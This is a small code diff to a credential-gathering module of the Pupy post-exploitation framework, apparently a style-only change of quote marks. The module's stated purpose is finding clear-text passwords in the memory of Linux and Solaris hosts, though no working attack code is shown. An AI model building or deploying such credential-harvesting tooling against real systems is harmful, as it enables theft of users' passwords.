@@ -4,14 +4,14 @@ from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 
 __class_name__='KeyloggerModule'
 
-@config(cat='gather', compat=['linux', 'solaris'])
+@config(cat='gather', compat=["linux", 'solaris'])
 class KeyloggerModule(PupyModule):
     '''
         Try to find clear text passwords in memory
     '''
     unique_instance = True
     dependencies = {
-        'linux': ['memorpy', 'hashmon'],
+        "linux": ['memorpy', 'hashmon'],
     }
 
     @classmethod
